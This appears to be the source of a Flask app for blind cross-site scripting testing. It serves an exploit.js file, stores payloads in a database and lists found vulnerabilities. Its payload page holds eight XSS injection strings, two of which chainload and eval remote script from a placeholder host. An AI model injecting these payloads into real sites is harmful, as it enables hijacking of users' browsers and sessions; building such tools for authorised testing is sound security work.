import requests
import models.vulnerability
from bs4 import BeautifulSoup
from flask import Flask, render_template
from jinja2 import Environment, FileSystemLoader
from flask import Flask, send_from_directory
from models.vulnerability import Vulnerability
from database import initialize_db, insert_payload, fetch_payloads, populate_payloads

env = Environment(loader = FileSystemLoader('templates'))
app = Flask(__name__)
import os
print(os.path.abspath('static/exploit.js'))


def setup():
    initialize_db()

@app.route("/")
def returnExploit():
    # Log the full path for debugging
    file_path = os.path.abspath("templates/exploit/exploit.js")
    print(f"Looking for file at: {file_path}")
    if not os.path.exists(file_path):
        print("File does not exist!")
        return "File not found", 404
    return send_from_directory("templates/exploit", "exploit.js")

@app.route("/dashboard")
def dashboard():
    return render_template('dashboard-view.html')

def basic_script():
    return "<script>alert('XSS 1');</script>"

def javascript_uri():
    return "javascript:alert('XSS 2');"

def input_onfocus():
    return "<input onfocus='alert(\"XSS 3\")'>"

def image_onerror():
    return "<img src='x' onerror='alert(\"XSS 4\")'>"

def video_source():
    return "<video><source onerror='alert(\"XSS 5\")'></video>"

def iframe_srcdoc():
    return "<iframe srcdoc='<script>alert(\"XSS 6\")</script>'></iframe>"

def xmlhttprequest_load():
    return '<script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "https://example.com");a.send();</script>'

def jquery_chainload():
    return '<script>$.getScript("https://example.com")</script>'

# Define the route for the payloads page
@app.route('/payloads')
def index():
    payloads = [
        {
            'func': basic_script,
            'title': 'Basic <code>&lt;script&gt;</code> Tag Payload',
            'description': 'Classic payload',
        },
        {
            'func': javascript_uri,
            'title': '<code>javascript:</code> URI Payload',
            'description': 'Link-based XSS',
        },
        {
            'func': input_onfocus,
            'title': '<code>&lt;input&gt;</code> Tag Payload',
            'description': 'HTML5 input-based payload',
        },
        {
            'func': image_onerror,
            'title': '<code>&lt;img&gt;</code> Tag Payload',
            'description': 'Image-based payload',
        },
        {
            'func': video_source,
            'title': '<code>&lt;video&gt;&lt;source&gt;</code> Tag Payload',
            'description': 'Video-based payload',
        },
        {
            'func': iframe_srcdoc,
            'title': '<code>&lt;iframe srcdoc=</code> Tag Payload',
            'description': 'iframe-based payload',
        },
        {
            'func': xmlhttprequest_load,
            'title': 'XMLHttpRequest Payload',
            'description': 'Inline execution chainload payload',
        },
        {
            'func': jquery_chainload,
            'title': '<code>$.getScript()</code> (jQuery) Payload',
            'description': 'Chainload payload for sites with jQuery',
        },
    ]
    return render_template('payloads-view.jinja', payloads=payloads)

@app.route("/results")
def found_vulns_page():
    found_vulns = [Vulnerability('https://example.com', '#username', '/')]
    return render_template('results-view.jinja', found_vulns=found_vulns)



def send_request():
    r = requests.get("https://example.com/")
    content = r.text

    soup = BeautifulSoup(content, 'html.parser')
    title = soup.title

    print("page title: " + title.text)


if __name__ == '__main__':
    initialize_db()  # Ensure the table exists
    populate_payloads()  # Insert payloads into the database
    payloads = fetch_payloads()  # Fetch and print all payloads
    for payload in payloads:
        print(payload)
    app.run(debug=True)
